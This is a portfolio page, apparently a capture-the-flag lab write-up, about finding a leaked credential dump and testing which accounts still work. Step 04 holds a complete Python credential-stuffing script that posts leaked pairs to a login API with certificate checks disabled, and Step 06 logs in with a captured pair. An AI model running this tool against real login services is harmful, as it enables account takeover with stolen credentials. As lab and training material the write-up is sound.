@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Oh My Data — Investigation, Leishka Pagan</title>
+<meta name="description" content="Credential leak analysis and active account detection. OSINT traced a leaked credential dump to a paste site; the login API was reverse-engineered from browser DevTools to capture the exact POST schema; a credential-testing tool was built in Python stdlib only, with no external dependencies, to identify accounts that remained active post-leak.">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;450;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/styles.css">
+
+<style>
+/* ============================================================
+   Investigation detail page — shared template.
+   Same skeleton as imperial-memory.html and samba.html.
+   Candidate for migration into the shared stylesheet later.
+   ============================================================ */
+
+/* -- case header ------------------------------------------------ */
+.case-header { padding: 3rem 0 2rem; border-bottom: 1px solid var(--border); margin-bottom: 3rem; }
+.case-meta { display: flex; flex-wrap: wrap; gap: 1.25rem; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1.25rem; }
+.case-meta span::before { content: '▸ '; color: var(--accent); }
+.case-title { font-size: clamp(1.9rem, 3.6vw, 2.6rem); font-weight: 700; letter-spacing: -0.02em; line-height: 1.15; margin-bottom: 1rem; }
+.case-subtitle { font-size: 1rem; color: var(--text-secondary); line-height: 1.7; max-width: 720px; }
+.back-link { display: inline-flex; align-items: center; gap: 0.4rem; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--text-muted); margin-bottom: 1.5rem; }
+.back-link:hover { color: var(--accent); }
+
+/* -- section rhythm --------------------------------------------- */
+.case-section { padding: 2.5rem 0; border-bottom: 1px solid var(--border); }
+.case-section:last-of-type { border-bottom: none; }
+.case-section h2 { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.12em; font-weight: 600; margin-bottom: 1.5rem; }
+.case-section h3 { font-size: 1.15rem; font-weight: 600; margin: 2rem 0 0.75rem; color: var(--text); }
+.case-section p { color: var(--text-secondary); line-height: 1.8; margin-bottom: 1rem; max-width: 760px; }
+.case-section code { font-family: 'JetBrains Mono', monospace; font-size: 0.82em; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); padding: 0.1rem 0.4rem; border-radius: 3px; color: var(--text); }
+
+/* -- findings table --------------------------------------------- */
+.findings { display: flex; flex-direction: column; gap: 0.85rem; margin-top: 1.25rem; }
+.finding { display: grid; grid-template-columns: 220px 260px 1fr; gap: 1.5rem; padding: 1.1rem 1.25rem; background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 6px; }
+.finding-label { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; align-self: start; padding-top: 0.1rem; }
+.finding-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--text); word-break: break-word; align-self: start; padding-top: 0.1rem; }
+.finding-desc { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.7; }
+
+/* -- IOC block -------------------------------------------------- */
+.ioc-block { background: var(--surface); border: 1px solid var(--accent-border); border-radius: 6px; padding: 1.25rem 1.4rem; margin: 1.75rem 0 0.5rem; }
+.ioc-label { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.12em; font-weight: 600; margin-bottom: 0.9rem; }
+.ioc-list { list-style: none; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; line-height: 1.9; color: var(--text-secondary); word-break: break-all; }
+.ioc-list li strong { color: var(--text); font-weight: 600; margin-right: 0.4rem; }
+
+/* -- tools ------------------------------------------------------ */
+.tools { display: flex; flex-direction: column; gap: 0.65rem; margin-top: 0.5rem; }
+.tool { display: grid; grid-template-columns: 230px 1fr; gap: 1.5rem; padding: 0.85rem 1.1rem; background: rgba(255, 255, 255, 0.02); border: 1px solid var(--border); border-radius: 5px; }
+.tool-name { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--text); font-weight: 500; align-self: start; }
+.tool-desc { font-size: 0.86rem; color: var(--text-secondary); line-height: 1.65; }
+
+/* -- steps ------------------------------------------------------ */
+.steps { display: flex; flex-direction: column; gap: 1rem; margin-top: 0.5rem; }
+.step { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 1.25rem 1.4rem; transition: var(--t-border); }
+.step:hover { border-color: var(--border-hover); }
+.step-head { display: flex; align-items: baseline; gap: 0.85rem; margin-bottom: 0.85rem; flex-wrap: wrap; }
+.step-num { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--accent); font-weight: 600; letter-spacing: 0.08em; }
+.step-title { font-size: 0.98rem; font-weight: 600; color: var(--text); }
+.step-status { font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; letter-spacing: 0.05em; padding: 0.15rem 0.55rem; border-radius: 3px; margin-left: auto; }
+.step-status.ok { color: var(--success); background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.2); }
+.step-status.blocked { color: var(--gate); background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); }
+.step-status.pivot { color: var(--warning); background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); }
+.step-cmd { font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--text); background: var(--bg); border: 1px solid var(--border); padding: 0.7rem 0.95rem; border-radius: 4px; margin: 0.6rem 0 0.85rem; overflow-x: auto; white-space: pre; line-height: 1.6; }
+.step-why { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.7; }
+.step-why strong { color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 0.76rem; text-transform: uppercase; letter-spacing: 0.08em; font-weight: 600; margin-right: 0.4rem; }
+
+/* -- pivot callout --------------------------------------------- */
+.pivot-callout { background: linear-gradient(to right, rgba(245, 158, 11, 0.06), transparent 70%); border-left: 3px solid var(--warning); padding: 1.1rem 1.3rem; margin: 1.5rem 0; border-radius: 0 6px 6px 0; }
+.pivot-callout .block-label { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--warning); text-transform: uppercase; letter-spacing: 0.12em; font-weight: 600; margin-bottom: 0.5rem; }
+.pivot-callout p { color: var(--text); font-size: 0.92rem; margin: 0; line-height: 1.7; }
+
+/* -- recommendations ------------------------------------------- */
+.recs { display: flex; flex-direction: column; gap: 1.1rem; margin-top: 0.5rem; }
+.rec { padding-left: 1.4rem; border-left: 2px solid var(--accent-border); }
+.rec-title { font-size: 0.95rem; font-weight: 600; color: var(--text); margin-bottom: 0.4rem; }
+.rec-body { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.75; }
+
+/* -- technical note -------------------------------------------- */
+.tech-note { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.75rem 1.9rem; margin-top: 1rem; }
+.tech-note .block-label { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.12em; font-weight: 600; margin-bottom: 1rem; }
+.tech-note p { max-width: 100%; font-size: 0.92rem; }
+
+/* -- case nav -------------------------------------------------- */
+.case-nav { display: grid; grid-template-columns: 1fr auto 1fr; gap: 1rem; padding: 2.5rem 0 4rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.case-nav a { font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--text-secondary); display: flex; align-items: center; gap: 0.5rem; padding: 0.9rem 1.1rem; border: 1px solid var(--border); border-radius: 5px; transition: var(--t-color), var(--t-border), var(--t-bg); }
+.case-nav a:hover { color: var(--accent); border-color: var(--accent-border); background: var(--accent-dim); }
+.case-nav .prev { justify-self: start; }
+.case-nav .index-link { justify-self: center; }
+.case-nav .next { justify-self: end; text-align: right; }
+.case-nav .label { color: var(--text-muted); font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em; display: block; margin-bottom: 0.15rem; }
+
+/* -- responsive ------------------------------------------------ */
+@media (max-width: 720px) {
+  .finding { grid-template-columns: 1fr; gap: 0.5rem; }
+  .tool { grid-template-columns: 1fr; gap: 0.35rem; }
+  .case-nav { grid-template-columns: 1fr; }
+  .case-nav .prev, .case-nav .index-link, .case-nav .next { justify-self: stretch; text-align: left; }
+  .step-cmd { font-size: 0.72rem; }
+}
+</style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<nav class="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">Leishka Pagan</a>
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../investigations.html">Investigations</a>
+      <a href="../experience.html">Experience</a>
+      <a href="../proof.html">Proof</a>
+      <a href="../contact.html">Contact</a>
+    </div>
+  </div>
+</nav>
+
+
+<main id="main">
+<div class="container">
+
+
+<!-- ==========================================================
+     CASE HEADER
+     ========================================================== -->
+<header class="case-header">
+  <a class="back-link" href="../investigations.html">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="12" height="12"><polyline points="15 18 9 12 15 6"/></svg>
+    All investigations
+  </a>
+
+  <div class="case-meta">
+    <span>Case 06</span>
+    <span>Application &amp; Data</span>
+    <span>Credential Leak &amp; Active Account Detection</span>
+  </div>
+
+  <h1 class="case-title">Oh My Data</h1>
+  <p class="case-subtitle">A breached credentials dump for CyberNT was reported, but the real question — which accounts were still active after the leak — was unanswered. OSINT traced the leak to a paste site. The raw credential format was reshaped through a Bash sed pipeline into machine-readable input. The login API was reverse-engineered from browser DevTools to capture the exact POST schema. The credential-testing tool was built in Python stdlib only, with no external dependencies, so it could run in an operationally restricted environment.</p>
+</header>
+
+
+<!-- ==========================================================
+     EXECUTIVE SUMMARY
+     ========================================================== -->
+<section class="case-section">
+  <h2>Executive Summary</h2>
+  <p>CyberNT disclosed a credential leak but had no visibility into which accounts in the leaked set remained active and exploitable. The analyst role was to locate the leak, validate the credentials against the live authentication surface, and identify accounts that were still compromised — answering the actual operational question, not just confirming the leak existed.</p>
+
+  <p>The leak was traced through OSINT to a Stikked paste site linked from the organization's own "Data Leaks" forum post. The raw dump used a human-readable <code>email -- password</code> format that was not directly consumable by automation. A single <code>sed</code> expression reshaped it to the conventional <code>email:password</code> combo list. Browser DevTools inspection of the login flow surfaced the exact POST endpoint, headers, and JSON body schema the application expected — including the non-standard <code>pass</code> key (not <code>password</code>) and the string marker <code>"Sorry &lt;user&gt;, your account has been disabled"</code> that distinguished valid-but-disabled accounts from valid-and-active ones.</p>
+
+  <p>The credential-testing tool was built using only <code>http.client</code>, <code>json</code>, and <code>ssl</code> from the Python standard library. No <code>requests</code>. No <code>pip install</code>. This constraint was deliberate — it meant the tool would run in any environment that had Python, regardless of package-install permissions. The script identified accounts that still authenticated successfully, confirming active compromise post-leak.</p>
+</section>
+
+
+<!-- ==========================================================
+     FINDINGS & ANALYSIS
+     ========================================================== -->
+<section class="case-section">
+  <h2>Findings &amp; Analysis</h2>
+
+  <div class="findings">
+
+    <div class="finding">
+      <div class="finding-label">Leak source identified</div>
+      <div class="finding-detail">Stikked paste site<br>(linked from cybernt-labs.com)</div>
+      <div class="finding-desc">Traced via the organization's own Posts → Data Leaks forum thread. The post linked to a paste site; searching the paste site for <code>cyber</code> surfaced the dump file named <code>CyberNT leaked passwords</code>.</div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">Credential format mismatch</div>
+      <div class="finding-detail">email -- password<br>(not machine-readable)</div>
+      <div class="finding-desc">The raw dump used a space-and-double-dash separator intended for human reading. Any automation pass had to normalize it first. Solved with a single <code>sed 's/ -- */:/g'</code> expression into conventional <code>email:password</code> combo format.</div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">Authentication endpoint</div>
+      <div class="finding-detail">POST /api/login<br>Content-Type: application/json</div>
+      <div class="finding-desc">Reverse-engineered from browser DevTools. The body schema used the non-standard key <code>pass</code> (not <code>password</code>) — a detail that would break any generic credential-testing script that assumed the conventional key name.</div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">Disabled-account marker</div>
+      <div class="finding-detail">"Sorry &lt;user&gt;, your account<br>has been disabled"</div>
+      <div class="finding-desc">Response-body string that indicated the credentials were <em>valid but the account had been disabled post-leak</em>. Presence of this string = disabled; absence = active, still-compromised account. This distinction was the operational answer the case was asked to produce.</div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">Active accounts detected</div>
+      <div class="finding-detail">results.txt<br>(valid, post-leak authentications)</div>
+      <div class="finding-desc">Output of the credential-testing script. Accounts that authenticated successfully without the disabled-account marker were written to <code>results.txt</code> as confirmed active compromises. These are the IOCs the organization needed to prioritize for rotation or disabling.</div>
+    </div>
+
+  </div>
+
+  <div class="ioc-block">
+    <div class="ioc-label">Operational reference</div>
+    <ul class="ioc-list">
+      <li><strong>Leak host:</strong> Stikked paste site (linked from cybernt-labs.com)</li>
+      <li><strong>Normalized input:</strong> combos.txt (<code>email:password</code> format)</li>
+      <li><strong>Target endpoint:</strong> https://cybernt-labs.com/api/login (POST, JSON)</li>
+      <li><strong>Body schema:</strong> { "email": "...", "pass": "..." }</li>
+      <li><strong>Disabled marker:</strong> response contains "Sorry"</li>
+      <li><strong>Output:</strong> results.txt (confirmed-active compromised credentials)</li>
+    </ul>
+  </div>
+</section>
+
+
+<!-- ==========================================================
+     TOOLS & TECHNOLOGIES
+     ========================================================== -->
+<section class="case-section">
+  <h2>Tools &amp; Technologies</h2>
+
+  <div class="tools">
+
+    <div class="tool">
+      <div class="tool-name">OSINT workflow</div>
+      <div class="tool-desc">Traced the leak from the organization's own disclosure post to the paste-site host. OSINT as a discipline, not a tool — the workflow was public-source pivot chaining, starting from the disclosure surface and landing on the raw dump.</div>
+    </div>
+
+    <div class="tool">
+      <div class="tool-name">Bash + sed</div>
+      <div class="tool-desc">Single-expression reformat of the raw dump into machine-readable combos. <code>sed 's/ -- */:/g'</code> handles the idiosyncratic separator without requiring a general-purpose parser.</div>
+    </div>
+
+    <div class="tool">
+      <div class="tool-name">Browser DevTools</div>
+      <div class="tool-desc">Network-tab inspection of the real login flow to capture the exact POST schema, headers, and response-body markers. DevTools is the authoritative source for how the application actually behaves — any assumption about the API that wasn't verified here was a risk of silent failure in the tester.</div>
+    </div>
+
+    <div class="tool">
+      <div class="tool-name">Python 3 (stdlib only)</div>
+      <div class="tool-desc">Credential-testing tool built with <code>http.client</code>, <code>json</code>, and <code>ssl</code>. No <code>requests</code>, no external packages. The constraint forced closer engagement with the HTTP layer and produced a tool that runs in any environment with Python installed.</div>
+    </div>
+
+    <div class="tool">
+      <div class="tool-name">ssl._create_unverified_context()</div>
+      <div class="tool-desc">Used to bypass certificate validation in the controlled lab environment. A deliberate constraint — never appropriate in production, documented here as a lab-only decision.</div>
+    </div>
+
+  </div>
+</section>
+
+
+<!-- ==========================================================
+     INVESTIGATION PROCESS
+     ========================================================== -->
+<section class="case-section">
+  <h2>Investigation Process</h2>
+
+  <p>Six steps. The defining move was not any one command — it was deciding, after the DevTools inspection, to build the credential tester in stdlib only rather than reach for <code>requests</code> or an existing framework. That choice is what made the tool portable.</p>
+
+
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 01</span>
+        <span class="step-title">OSINT — locate the leaked credentials</span>
+        <span class="step-status ok">Dump retrieved</span>
+      </div>
+      <div class="step-cmd"># Starting surface: cybernt-labs.com → Posts → Data Leaks
+# Followed the linked Stikked paste site
+# Searched for: cyber
+# Retrieved: CyberNT leaked passwords → saved as Leak.txt</div>
+      <p class="step-why"><strong>Why:</strong> Start from the disclosure surface and pivot outward. The organization's own "Data Leaks" post was the shortest path to the actual dump — faster and less noisy than searching paste aggregators blindly. Saving the file locally under a known name keeps the evidence chain auditable.</p>
+    </div>
+
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 02</span>
+        <span class="step-title">Normalize the credential format</span>
+        <span class="step-status ok">combos.txt written</span>
+      </div>
+      <div class="step-cmd">sed 's/ -- */:/g' Leak.txt &gt; combos.txt</div>
+      <p class="step-why"><strong>Why:</strong> The raw dump used <code>email -- password</code>, which is human-readable but not consumable by automation that expects the standard <code>email:password</code> combo format. A single <code>sed</code> substitution with a trailing-space tolerance (<code>' -- *'</code>) handles format variation without writing a parser. Output redirected to a new file preserves the original for audit.</p>
+    </div>
+
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 03</span>
+        <span class="step-title">Inspect the login flow in DevTools</span>
+        <span class="step-status ok">Schema captured</span>
+      </div>
+      <div class="step-cmd"># Browser DevTools → Network tab
+# Submitted a test login, captured the POST request
+
+POST https://cybernt-labs.com/api/login
+Content-Type: application/json
+
+Body:
+{
+  "email": "user@cybernt.com",
+  "pass":  "password123"
+}
+
+Failure response contains:
+"Sorry &lt;user&gt;, your account has been disabled"</div>
+      <p class="step-why"><strong>Why:</strong> Never guess an API schema. The application uses <code>pass</code>, not <code>password</code> — a detail that would silently break any generic credential-testing script that assumed the conventional key. The response-body marker <code>"Sorry"</code> is the signal that separates disabled from active accounts; capturing it here, before writing any code, is what makes the detection logic correct on the first run.</p>
+    </div>
+
+
+    <div class="pivot-callout">
+      <div class="block-label">Build decision — stdlib only</div>
+      <p>The obvious move after DevTools is to reach for <code>requests</code> and have the tool running in ten lines. The decision here was to not do that — to build the credential tester using only <code>http.client</code>, <code>json</code>, and <code>ssl</code> from the Python standard library. That means no <code>pip install</code>, no dependency surface, no package-manager permissions required. The tool will run in any environment that has Python, which is the actual operational constraint a credential-validation tool needs to meet when it's going to be used on arbitrary analyst machines. The cost is extra lines; the benefit is portability. For a tool whose purpose is to run wherever the next incident happens, the trade is obviously right.</p>
+    </div>
+
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 04</span>
+        <span class="step-title">Develop the credential-testing script</span>
+        <span class="step-status ok">stdlib only</span>
+      </div>
+      <div class="step-cmd">import http.client
+import json
+import ssl
+
+host = "cybernt-labs.com"
+endpoint = "/api/login"
+headers = {
+    "Content-Type": "application/json",
+    "User-Agent": "PythonClient"
+}
+
+ssl_context = ssl._create_unverified_context()
+
+with open("combos.txt", "r") as f:
+    for line in f:
+        if ':' not in line:
+            continue
+        email, password = line.strip().split(":", 1)
+        payload = json.dumps({"email": email, "pass": password})
+
+        try:
+            conn = http.client.HTTPSConnection(host, context=ssl_context)
+            conn.request("POST", endpoint, body=payload, headers=headers)
+            res = conn.getresponse()
+            body = res.read().decode()
+
+            if "Sorry" not in body:
+                print(f"[+] VALID: {email}:{password}")
+                with open("results.txt", "a") as out:
+                    out.write(f"{email}:{password}\n")
+            else:
+                print(f"[-] Disabled: {email}:{password}")
+
+            conn.close()
+        except Exception as e:
+            print(f"[!] Error with {email}: {str(e)}")</div>
+      <p class="step-why"><strong>Why:</strong> Every design choice is explicit. <code>split(":", 1)</code> handles passwords containing colons without breaking on them. The <code>"Sorry" not in body</code> check matches the exact marker captured in DevTools — not a guess, not a status-code heuristic, the actual string the application returns. Valid hits are both printed (for live feedback) and appended to <code>results.txt</code> (for durable output). The <code>try/except</code> around the request isolates network failures from credential logic so one bad row doesn't abort the run.</p>
+    </div>
+
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 05</span>
+        <span class="step-title">Execute and collect results</span>
+        <span class="step-status ok">Active accounts identified</span>
+      </div>
+      <div class="step-cmd">python3 brute_force_builtin.py</div>
+      <p class="step-why"><strong>Why:</strong> Run the tester against the normalized combo list. Each credential prints its status (<code>[+] VALID</code> or <code>[-] Disabled</code>) for live triage, and confirmed-active credentials append to <code>results.txt</code>. The output is immediately usable as a prioritized list of accounts for rotation or disabling.</p>
+    </div>
+
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">Step 06</span>
+        <span class="step-title">Validate with captured credentials</span>
+        <span class="step-status ok">Access confirmed</span>
+      </div>
+      <div class="step-cmd"># Logged in manually with one of the confirmed-active pairs
+# Reached the CyberNT internal portal
+# Retrieved the challenge flag</div>
+      <p class="step-why"><strong>Why:</strong> End-to-end validation. The tester identified credentials the <em>API</em> accepted — confirming full login through the application proves the accepted credentials actually grant portal access, not just a positive authentication response. This closes the loop on the operational question: yes, accounts remain compromised post-leak.</p>
+    </div>
+
+  </div>
+</section>
+
+
+<!-- ==========================================================
+     RECOMMENDATIONS
+     ========================================================== -->
+<section class="case-section">
+  <h2>Recommendations</h2>
+
+  <div class="recs">
+
+    <div class="rec">
+      <div class="rec-title">Rotate, don't just disable — and verify</div>
+      <div class="rec-body">A credential leak is not resolved by disabling the accounts flagged in the dump. Accounts that remain active after the leak must be rotated (forced password reset, session invalidation) and then re-validated against the same credential list to confirm the old credentials no longer authenticate. Disabling alone leaves an attack surface if the disabled state is reversible by any internal process.</div>
+    </div>
+
+    <div class="rec">
+      <div class="rec-title">Capture the exact API schema before writing detection tooling</div>
+      <div class="rec-body">Credential-testing tools that assume conventional key names (<code>password</code>, <code>username</code>) and conventional response patterns (HTTP 401, generic error bodies) will silently fail against real applications that deviate from those conventions. DevTools is the authoritative source; using it first saves debugging cycles later.</div>
+    </div>
+
+    <div class="rec">
+      <div class="rec-title">Build portable tooling by default</div>
+      <div class="rec-body">Security tools written with the standard library alone are deployable in any environment that has the runtime, without package-manager permissions or dependency-resolution failures. For tools whose purpose is to run wherever the next incident lands, the portability is worth the additional lines of code. Reach for frameworks only when the functionality they provide is not reasonably achievable with the stdlib.</div>
+    </div>
+
+    <div class="rec">
+      <div class="rec-title">Monitor organization's own disclosure channels</div>
+      <div class="rec-body">The leak in this case was linked from the organization's own "Data Leaks" forum post — a surface the organization controls but may not be actively monitoring for external pivots. Any published disclosure becomes an OSINT entry point; the same attention paid to external leak indexes should be paid to internal channels that link to them.</div>
+    </div>
+
+    <div class="rec">
+      <div class="rec-title">Never bypass certificate validation outside controlled labs</div>
+      <div class="rec-body"><code>ssl._create_unverified_context()</code> was used here for the controlled lab environment and should be documented as such. In any production credential-validation context, certificate verification must be enabled — a MITM against the validation tool itself could harvest every credential it tests.</div>
+    </div>
+
+  </div>
+</section>
+
+
+<!-- ==========================================================
+     TECHNICAL NOTE
+     ========================================================== -->
+<section class="case-section">
+  <h2>Technical Note</h2>
+
+  <div class="tech-note">
+    <div class="block-label">Why stdlib-only matters for credential tooling</div>
+    <p>The design decision that defines this case is refusing to use <code>requests</code>. That choice makes the credential tester operate at the raw <code>http.client</code> level — constructing the HTTPS connection, forming the JSON body, reading the response, all explicitly. There is no magic. Every behavior the tool exhibits is visible in the forty lines of code that produce it.</p>
+
+    <p>The operational consequence is portability. The tool has no <code>pip</code> dependencies. It runs in any environment with a Python 3 interpreter — including locked-down analyst workstations, customer-premises boxes under change control, and air-gapped lab images where package installation is blocked. A credential-validation tool that needs to install <code>requests</code> before it can run is a credential-validation tool that does not run when you need it most.</p>
+
+    <p>The secondary consequence is defensibility. A stdlib-only tool has a trivially small supply-chain attack surface. There is no transitive dependency graph, no version-pin drift, no <code>typosquatting</code> package risk. For security tooling specifically, that matters: a credential tester that has been compromised via an upstream package is a credential harvester.</p>
+  </div>
+</section>
+
+
+<!-- ==========================================================
+     REFERENCES
+     ========================================================== -->
+<section class="case-section">
+  <h2>References</h2>
+
+  <ol class="refs">
+    <li><strong>Python <code>http.client</code> documentation.</strong> Standard-library HTTP client used to construct and send the credential-validation requests without external dependencies. <a href="https://docs.python.org/3/library/http.client.html" target="_blank" rel="noopener">docs.python.org</a></li>
+
+    <li><strong>OWASP Credential Stuffing Prevention Cheat Sheet.</strong> Defender-side guidance for detecting and mitigating the attack class this case validates from the analyst side. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">cheatsheetseries.owasp.org</a></li>
+
+    <li><strong>NIST SP 800-63B — Digital Identity Guidelines.</strong> Authoritative guidance on credential lifecycle including rotation requirements following known compromise. <a href="https://pages.nist.gov/800-63-3/sp800-63b.html" target="_blank" rel="noopener">nist.gov</a></li>
+  </ol>
+</section>
+
+
+<!-- ==========================================================
+     BOTTOM NAV
+     ========================================================== -->
+<nav class="case-nav" aria-label="Investigation navigation">
+  <a class="prev" href="mail-n-trail.html">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><polyline points="15 18 9 12 15 6"/></svg>
+    <span>
+      <span class="label">Previous case</span>
+      Mail n' Trail — Credential &amp; SIEM
+    </span>
+  </a>
+
+  <a class="index-link" href="../investigations.html">Index</a>
+
+  <a class="next" href="../investigations.html">
+    <span>
+      <span class="label">Back to</span>
+      All investigations
+    </span>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><polyline points="9 18 15 12 9 6"/></svg>
+  </a>
+</nav>
+
+
+</div>
+</main>
+
+
+<footer class="container">
+  <p>&copy; 2026 Leishka Pagan</p>
+</footer>
+
+
+<script src="../assets/js/main.js" defer></script>
+</body>
+</html>
